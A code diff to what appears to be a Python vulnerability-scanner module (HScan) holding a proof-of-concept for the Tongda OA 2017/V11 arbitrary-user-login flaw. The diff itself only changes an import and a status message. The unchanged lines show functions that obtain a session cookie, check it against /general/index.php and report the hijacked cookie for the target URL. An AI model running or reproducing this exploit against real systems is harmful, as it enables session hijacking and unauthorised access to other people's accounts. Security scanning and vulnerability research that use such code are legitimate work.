@@ -3,7 +3,7 @@ import json
 import requests
 from random import choice
 
-import main
+from HScan.main import print_green
 
 # 源码来源：https://github.com/Haoyunforever/Study/blob/5befafcf0d332b97bb37ad5e46dd93bf06b1da6b/vuln/2%E3%80%81OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA2017%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md
 
@@ -66,7 +66,7 @@ def getV11Session(url,timeout):
         check_available = requests.get(url + '/general/index.php', headers=headers,timeout=timeout)
         if '用户未登录' not in check_available.text:
             if '重新登录' not in check_available.text:
-                main.print_green(f'{poc_name} ====> 存在漏洞 ====> {tmp_cookie}')
+                print_green(f'{poc_name} ====> 存在漏洞 ====> {url}\nCookie为:{tmp_cookie}')
                 return '成功获取cookie:' + tmp_cookie
         else:
             return 'Something Wrong With ' + url + ',Maybe Not Vulnerable.'
@@ -98,7 +98,7 @@ def get2017Session(url,timeout):
             check_available = requests.get(url + '/general/index.php', headers=headers,timeout=timeout)
             if '用户未登录' not in check_available.text:
                 if '重新登录' not in check_available.text:
-                    main.print_green(f'{poc_name} ====> 存在漏洞 ====> {tmp_cookie}')
+                    print_green(f'{poc_name} ====> 存在漏洞 ====> {url}\nCookie为:{tmp_cookie}')
             else:
                 return 'Something Wrong With ' + url + ',Maybe Not Vulnerable.'
         else:
